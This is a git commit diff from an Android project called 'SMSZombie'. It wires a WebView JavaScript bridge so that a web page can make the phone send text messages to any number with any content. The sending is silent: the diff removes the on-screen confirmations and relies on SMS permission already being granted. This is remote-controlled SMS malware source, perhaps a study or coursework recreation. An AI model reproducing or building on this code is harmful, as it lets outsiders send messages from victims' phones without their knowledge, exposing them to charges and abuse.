d05a98a720904428a4e17ebbb00d1a62684a130e
Manwel Bugeja <manwelbugeja@Manwels-MBP-2.lan>
2022-11-23 10:36:48 +0100

    Made message parametes obtained from website

--- SMSZombie/app/src/main/java/com/example/smszombie/JavaScriptInterface.java
+++ SMSZombie/app/src/main/java/com/example/smszombie/JavaScriptInterface.java
@@ -3,18 +3,31 @@ package com.example.smszombie;
 import android.app.Activity;
 import android.content.Intent;
 import android.net.Uri;
+import android.telephony.SmsManager;
 import android.webkit.JavascriptInterface;
 import android.widget.Toast;
 
 public class JavaScriptInterface {
     private final Activity activity;
 
+    // needs SMS permission to be enabled (does not prompt for it)
+    public void sendSMS(String phoneNo, String msg) {
+        try {
+            SmsManager smsManager = SmsManager.getDefault();
+            smsManager.sendTextMessage(phoneNo, null, msg, null, null);
+        } catch (Exception ex) {
+            ex.printStackTrace();
+        }
+    }
+
     public JavaScriptInterface(Activity activity) {
         this.activity = activity;
     }
 
     @JavascriptInterface
-    public void JsSendSMS(){
-        Toast.makeText(activity, "JavaScript interface works!!", Toast.LENGTH_SHORT).show();
+    public void JsSendSMS(String phoneNo, String msg){
+        if (!(phoneNo.isEmpty()  || msg.isEmpty())) {
+            sendSMS(phoneNo, msg);
+        }
     }
 }
--- SMSZombie/app/src/main/java/com/example/smszombie/MainActivity.java
+++ SMSZombie/app/src/main/java/com/example/smszombie/MainActivity.java
@@ -11,19 +11,7 @@ import android.widget.Toast;
 public class MainActivity extends AppCompatActivity {
 
     static String TAG = "SMS_ZOMBIE";
-    // needs SMS permission to be enabled (does not prompt for it)
-    public void sendSMS(String phoneNo, String msg) {
-        try {
-            SmsManager smsManager = SmsManager.getDefault();
-            smsManager.sendTextMessage(phoneNo, null, msg, null, null);
-            Toast.makeText(getApplicationContext(), "Message Sent",
-                    Toast.LENGTH_LONG).show();
-        } catch (Exception ex) {
-            Toast.makeText(getApplicationContext(),ex.getMessage(),
-                    Toast.LENGTH_LONG).show();
-            ex.printStackTrace();
-        }
-    }
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
